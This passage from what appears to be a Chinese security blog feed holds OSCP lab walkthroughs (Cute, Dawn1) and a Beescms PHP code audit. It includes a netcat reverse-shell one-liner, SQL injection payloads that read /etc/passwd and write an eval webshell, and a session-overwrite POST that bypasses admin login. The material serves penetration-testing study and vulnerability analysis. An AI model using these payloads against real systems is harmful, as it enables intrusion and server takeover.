alt="image-20240725204954003"></p><p>改为php后缀</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210038266.png" alt="image-20240725210038266"></p><p>给了个报错，说头像不合格</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210108029.png" alt="image-20240725210108029"></p><p>应该是有检测机制，我们写入一个真正的图片中去</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210315667.png" alt="image-20240725210315667"></p><p>更改后缀，啊，又有新的情况；是一个csrf 的防御机制，这个我们重新抓包来一遍即可</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210355998.png" alt="image-20240725210355998"></p><p>成功上传</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210556143.png" alt="image-20240725210556143"></p><p>那上传到什么位置了呢？之前看到有个<code>uploads</code>的目录，尝试执行命令</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210813322.png" alt="image-20240725210813322"></p><p>执行失败了，可能是木马有问题，重新尝试；不对，看到文件的上传点居然在另一个域名</p><p><img src="/img/OSCP-BBS-Cute/image-20240725213434128.png" alt="image-20240725213434128"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>重新返回去看之前命令执行的py 文件，在翻看了源代码之后发现确实存在差错</p><p><img src="/img/OSCP-BBS-Cute/image-20240725213733685.png" alt="image-20240725213733685"></p><p>这里多了<code>CuteNews</code>的路径，需要删除全文的这个路径；大概有五处需要修改，修改之后再次执行</p><p><img src="/img/OSCP-BBS-Cute/image-20240725214001302.png" alt="image-20240725214001302"></p><p>成功获取shell，之后我们反弹过来nc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.56.101 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725214201428.png" alt="image-20240725214201428"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>发现可以sudo 的使用hping3，直接提权</p><p><img src="/img/OSCP-BBS-Cute/image-20240725215626801.png" alt="image-20240725215626801"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Dawn1</title>
      <link href="/2024/07/24/OSCP-Dawn1/"/>
      <url>/2024/07/24/OSCP-Dawn1/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Dawn1"><a href="#OSCP系列靶机—Dawn1" class="headerlink" title="OSCP系列靶机—Dawn1"></a>OSCP系列靶机—Dawn1</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p>这个靶机需要放在virtualBox 上，那么有关virtualBox 与 VMware 的kali网络通讯方法请访问：<a href="https://lusensec.github.io/2024/07/23/Nouns-VirtualBox-VMware-networking/">【基础知识】VirtualBox和VMware的kali搭配食用 | Lusen的小窝 (lusensec.github.io)</a></p><p><img src="/img/OSCP-Dawn1/image-20240724191243817.png" alt="image-20240724191243817"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速探测</p><p><img src="/img/OSCP-Dawn1/image-20240724191602248.png" alt="image-20240724191602248"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-Dawn1/image-20240724192957783.png" alt="image-20240724192957783"></p><p>我们连带UDP也一起扫描</p><p><img src="/img/OSCP-Dawn1/image-20240724193358714.png" alt="image-20240724193358714"></p><p>3、服务版本探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 80,137,139,445,3306,5353 192.168.56.103</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Dawn1/image-20240724193554220.png" alt="image-20240724193554220"></p><p>都是常见的那些服务，这里5353是需要udp扫描，暂时先搁置下来；后面也有对主机的一个扫描，跑在linux服务器上</p><p><img src="/img/OSCP-Dawn1/image-20240724193616284.png" alt="image-20240724193616284"></p><p>这个smb服务会不会存在漏洞呢</p><p>4、漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 80,137,139,445,3306,5353 192.168.56.103</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Dawn1/image-20240724194045320.png" alt="image-20240724194045320"></p><p>80端口做了一个目录扫描，发现<code>logs</code>目录；后面还有对主机展开探测的，发现一个易受dos攻击的smb服务</p><p><img src="/img/OSCP-Dawn1/image-20240724194221909.png" alt="image-20240724194221909"></p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页与源代码"><a href="#1、首页与源代码" class="headerlink" title="1、首页与源代码"></a>1、首页与源代码</h3><p><img src="/img/OSCP-Dawn1/image-20240724194421929.png" alt="image-20240724194421929"></p><p>OK，没有给任何的提示，甚至这个标签写的都有点不太到位</p><p><img src="/img/OSCP-Dawn1/image-20240724194535214.png" alt="image-20240724194535214"></p><h3 id="2、目录探测"><a href="#2、目录探测" class="headerlink" title="2、目录探测"></a>2、目录探测</h3><p><img src="/img/OSCP-Dawn1/image-20240724194747417.png" alt="image-20240724194747417"></p><p>也是只扫到<code>logs</code>目录</p><h3 id="3、logs目录"><a href="#3、logs目录" class="headerlink" title="3、logs目录"></a>3、logs目录</h3><p><img src="/img/OSCP-Dawn1/image-20240724194815126.png" alt="image-20240724194815126"></p><p>欸，这个<code>auth.log</code>的文件名好眼熟欸，但是我们点进去之后是这样的；看来作为www用户是没有访问权限的</p><p><img src="/img/OSCP-Dawn1/image-20240724194914332.png" alt="image-20240724194914332"></p><p>但是这个文件却可以下载下来</p><p><img src="/img/OSCP-Dawn1/image-20240724195020324.png" alt="image-20240724195020324"></p><p>这个文件的内容看起来像是某个监控软件的日志；结合www用户可以查看，推测是web服务应用</p><p><img src="/img/OSCP-Dawn1/image-20240724195603660.png" alt="image-20240724195603660"></p><p>所以web一定是有东西存在的</p><h2 id="四、SMB信息收集"><a href="#四、SMB信息收集" class="headerlink" title="四、SMB信息收集"></a>四、SMB信息收集</h2><h3 id="1、尝试smb连接"><a href="#1、尝试smb连接" class="headerlink" title="1、尝试smb连接"></a>1、尝试smb连接</h3><p><img src="/img/OSCP-Dawn1/image-20240724214009409.png" alt="image-20240724214009409"></p><p>尝试连接；连接成功，有一个文件，下载下来查看确是一个空文件</p><p><img src="/img/OSCP-Dawn1/image-20240724214249107.png" alt="image-20240724214249107"></p><p><img src="/img/OSCP-Dawn1/image-20240724214457912.png" alt="image-20240724214457912"></p><h3 id="2、尝试smb文件上传"><a href="#2、尝试smb文件上传" class="headerlink" title="2、尝试smb文件上传"></a>2、尝试smb文件上传</h3><p>既然这个smb 里面没有东西，那我们尝试文件上传</p><p><img src="/img/OSCP-Dawn1/image-20240724214538582.png" alt="image-20240724214538582"></p><p>上传成功，可以上传文件，这在之后的渗透中可能有用</p><h2 id="五、MySQL信息收集"><a href="#五、MySQL信息收集" class="headerlink" title="五、MySQL信息收集"></a>五、MySQL信息收集</h2><p>在简单尝试了弱口令失败后，提示给的密码不正确，我们来尝试爆破密码</p><p><img src="/img/OSCP-Dawn1/image-20240724215424155.png" alt="image-20240724215424155"></p><p>先爆破，继续往后</p><h2 id="六、Getshell"><a href="#六、Getshell" class="headerlink" title="六、Getshell"></a>六、Getshell</h2><h3 id="1、managemet-log-文件"><a href="#1、managemet-log-文件" class="headerlink" title="1、managemet.log 文件"></a>1、managemet.log 文件</h3><p>到此为止，再无任何的信息可供收集，于是又去看了<code>management.log</code>文件，重新下载了一遍</p><p><img src="/img/OSCP-Dawn1/image-20240724220244351.png" alt="image-20240724220244351"></p><p>居然多了好多东西，看这样子，好像是系统各进程的信息</p><p><img src="/img/OSCP-Dawn1/image-20240724220324695.png" alt="image-20240724220324695"></p><p>之前没有这些东西，可能是刚开机，很多服务没加载出来；在最后发现了很多有趣的东西</p><p><img src="/img/OSCP-Dawn1/image-20240724220543948.png" alt="image-20240724220543948"></p><p>有两个用户名<code>ganimedes</code>和<code>dawn</code>，还有两个777的文件，其中一个文件的路径很可疑，<code>/home/dawn/ITDEPT/web-control</code>中的<code>ITDEPT</code>似乎在哪儿见过</p><p><img src="/img/OSCP-Dawn1/image-20240724221032662.png" alt="image-20240724221032662"></p><p>欸，莫不是同一个地方？</p><h3 id="2、smb文件上传加定时执行getshell"><a href="#2、smb文件上传加定时执行getshell" class="headerlink" title="2、smb文件上传加定时执行getshell"></a>2、smb文件上传加定时执行getshell</h3><p>在<code>management.log</code>文件中显示，只会执行<code>ITDEPT</code>路径下的<code>web-control</code>文件，所以我们可以构造一个反弹shell 的<code>web-control</code>文件上去等待执行</p><p><img src="/img/OSCP-Dawn1/image-20240724221357960.png" alt="image-20240724221357960"></p><p>通过smb 上传该文件，等待执行</p><p><img src="/img/OSCP-Dawn1/image-20240724221430449.png" alt="image-20240724221430449"></p><p>等待了许长时间不见反弹，我们修改反弹的命令，再次等待</p><p><img src="/img/OSCP-Dawn1/image-20240724222148047.png" alt="image-20240724222148047"></p><p>OK，也是终于接收到反弹了，成功getshell</p><h2 id="七、权限提升"><a href="#七、权限提升" class="headerlink" title="七、权限提升"></a>七、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-Dawn1/image-20240724222400890.png" alt="image-20240724222400890"></p><p>这里logs目录的其他文件果然是www用户无权限查看</p><p><img src="/img/OSCP-Dawn1/image-20240724222502809.png" alt="image-20240724222502809"></p><p>欸，这里有个<code>.index.html.swp</code>文件竟然没有扫出来，看来以后要扫描到细致才行</p><p><img src="/img/OSCP-Dawn1/image-20240724223047805.png" alt="image-20240724223047805"></p><p>这里也确实是我们推测的那个目录</p><h3 id="2、sudo提升至root"><a href="#2、sudo提升至root" class="headerlink" title="2、sudo提升至root"></a>2、sudo提升至root</h3><p>发现存在sudo 滥用，直接一句话提权</p><p><img src="/img/OSCP-Dawn1/image-20240724223323889.png" alt="image-20240724223323889"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PHP代码审计】Beescms代码审计</title>
      <link href="/2024/07/24/Code-Audit-PHP-Beescms/"/>
      <url>/2024/07/24/Code-Audit-PHP-Beescms/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>前几天在nssctf 参加了awd 赛事，使用的靶场就是Beescms，赛事过后对这个靶场多了一点理解，趁热打铁，分析一下beescms 漏洞造成的原因</p><h1 id="二、后台登陆SQL注入漏洞"><a href="#二、后台登陆SQL注入漏洞" class="headerlink" title="二、后台登陆SQL注入漏洞"></a>二、后台登陆SQL注入漏洞</h1><p>漏洞代码位置在<code>admin/login.php</code>文件中</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241021235458049.png" alt="image-20241021235458049"></p><p>而真正实现登陆查询的操作在<code>includes/fun.php</code>的<code>check_login</code> 函数，我们来观察这个函数的主要代码部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rel</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span> . DB_PRE . <span class="string">&quot;admin where admin_name=&#x27;&quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&#x27; limit 0,1&quot;</span>);</span><br><span class="line"><span class="variable">$rel</span> = <span class="keyword">empty</span>(<span class="variable">$rel</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="variable">$rel</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$rel</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&#x27;不存在该管理用户&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$password</span> != <span class="variable">$rel</span>[<span class="string">&#x27;admin_password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&quot;输入的密码不正确&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rel</span>[<span class="string">&#x27;is_disable&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&#x27;该账号已经被锁定,无法登陆&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 则登陆成功</span></span><br></pre></td></tr></table></figure><p>可以看到，我们传入的用户名直接拼接在SQL语句中，造成SQL注入；当然，光这里是不够的，我们发现，在后端接收账号密码的时候就利用函数进行了过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>我们先看下<code>fl_value</code> 函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file |outfile/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判断了用户名是否为空，然后对其中的<code>select</code>等字符替换为空，这个地方我们可以用双写绕过</p><p>再看<code>fl_html</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数用<code>htmlspecialchars</code> 将用户名进行html实体转换，但是，他这个写法有丢丢缺陷，如下：</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022000854070.png" alt="image-20241022000854070"></p><p>就是说，这里并没有过滤单引号’，导致被绕过</p><p>payload如下：</p><p>1’ a and nd extractvalue(1,concat(0x7e,(select user()),0x7e))#</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022001524357.png" alt="image-20241022001524357"></p><p>其他利用如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、读取文件：</span></span><br><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(select load_file(&#x27;</span>/etc/passwd<span class="string">&#x27;)),0x7e))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 2、写入webshell</span></span><br><span class="line"><span class="string">admin&#x27;</span> uni union on selselectect <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e</span>  in into  outoutfilefile <span class="string">&#x27;/var/www/html/index_backup.php&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27; uni union on selselectect null,null,null,null,char(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 99, 109, 100, 93, 41, 59, 63, 62)  in into  outoutfilefile &#x27;</span>C:/phpStudy/WWW/beescms/cmd.php<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h1 id="三、后台文件上传Getshell"><a href="#三、后台文件上传Getshell" class="headerlink" title="三、后台文件上传Getshell"></a>三、后台文件上传Getshell</h1><p>来后台添加文章模块中上传图片</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022001903887.png" alt="image-20241022001903887"></p><p>在BP中看到传递的链接地址在<code>/admin/admin_pic_upload.php?type=radio&amp;get=thumb</code></p><p>查看关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value_arr</span> = <span class="title function_ invoke__">up_img</span>(<span class="variable">$pic_info</span>,<span class="variable">$is_up_size</span>,<span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/bmp&#x27;</span>,<span class="string">&#x27;image/pjpeg&#x27;</span>,<span class="string">&#x27;image/x-png&#x27;</span>),<span class="variable">$up_is_thumb</span>,<span class="variable">$up_thumb_width</span>,<span class="variable">$up_thumb_height</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_name_alt</span>);</span><br></pre></td></tr></table></figure><p>可以看到在后端似乎仅仅做了MIME检测，这个是很好绕过的，在<code>up_img</code> 函数中也仅仅限制了大小和判断了MIME 格式，但是有一个点是会重命名文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$up_file_name</span> = <span class="keyword">empty</span>(<span class="variable">$pic_alt</span>) ? <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) : <span class="variable">$pic_alt</span>;</span><br></pre></td></tr></table></figure><p>我们需要去拿文件，然后跟上php即可连接shell</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022004613854.png" alt="image-20241022004613854"></p><h1 id="四、任意PHP文件包含漏洞"><a href="#四、任意PHP文件包含漏洞" class="headerlink" title="四、任意PHP文件包含漏洞"></a>四、任意PHP文件包含漏洞</h1><p>漏洞点：<code>admin/admin_channel.php</code></p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022223611872.png" alt="image-20241022223611872"></p><p>由于校验不严格导致可以利用..&#x2F;包含任意php文件</p><p>这个漏洞稍有点鸡肋，你都登陆后台了，还差包含他这个php吗</p><h1 id="五、水平越权漏洞"><a href="#五、水平越权漏洞" class="headerlink" title="五、水平越权漏洞"></a>五、水平越权漏洞</h1><p>在访问<code>admin/admin.php</code>的代码中包含了<code>init.php</code>文件，这个文件中实现了判断是否是管理员的登陆状态，如下关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查登陆</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_login</span>())&#123;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:login.php&#x27;</span>);<span class="keyword">exit</span>;&#125;</span><br></pre></td></tr></table></figure><p>那么实现检查的代码在<code>is_login()</code>函数中，查看逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login_in&#x27;</span>] == <span class="number">1</span> &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123; <span class="comment">// 判断session中login_in 是否为1以及admin是否有值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() - <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] &gt; <span class="number">3600</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">login_out</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line">            @<span class="title function_ invoke__">session_regenerate_id</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_purview&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_time&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_in&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_ip&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码本身的逻辑是不存在问题的，问题出在其他的很多地方引用了这个逻辑，比如有这样一个文件，<code>includes/init.php</code>，关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>))&#123;<span class="variable">$_REQUEST</span>  = <span class="title function_ invoke__">fl_value</span>(<span class="variable">$_REQUEST</span>);&#125;</span><br><span class="line">    <span class="variable">$_COOKIE</span>   = <span class="title function_ invoke__">fl_value</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="variable">$_GET</span> = <span class="title function_ invoke__">fl_value</span>(<span class="variable">$_GET</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_COOKIE</span>);</span><br></pre></td></tr></table></figure><p>附上extract() 函数简单简介</p><blockquote><p><em>PHP extract() 函数是从数组中把变量导入到当前的符号表中进行变量覆盖</em></p></blockquote><p>如果我们利用extract() 函数覆盖session 的内容如何呢？毕竟在代码的上方开启了session。</p><p>fl_value() 函数的内容我们在SQL注入那里分析过，会进行一些过滤，但是我们发现这里的POST是没有进行过滤的，我们就利用POST来进行session变量覆盖</p><p>在我们的首页<code>index.php</code>中就发现引用了这个<code>includes/init.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMS&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/init.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/fun.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/lib.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>因此，访问首页直接传递POST即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[login_in]=<span class="number">1</span>&amp;_SESSION[admin]=<span class="number">1</span>&amp;_SESSION[login_time]=<span class="number">1729688888</span></span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022230933955.png" alt="image-20241022230933955"></p><h1 id="六、任意文件读取漏洞"><a href="#六、任意文件读取漏洞" class="headerlink" title="六、任意文件读取漏洞"></a>六、任意文件读取漏洞</h1><p>在<code>admin/admin_template.php</code>文件中存在一个任意文件读取漏洞，关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模板修改界面</span></span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$action</span>==<span class="string">&#x27;xg&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span>=CMS_PATH.<span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;r+&#x27;</span>))&#123;<span class="title function_ invoke__">err</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;模板打开失败,请确定【&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;】模板是否存在&lt;/span&gt;&#x27;</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_EX);</span><br><span class="line"><span class="variable">$str</span>=@<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;&amp;amp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span>= <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;&amp;#39;&quot;</span>,<span class="string">&quot;&amp;quot;&quot;</span>,<span class="string">&quot;&amp;lt;&quot;</span>,<span class="string">&quot;&amp;gt;&quot;</span>),<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_UN);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，对传入要读取的file 文件并没有做限制，导致任意文件的读取</p><p><img 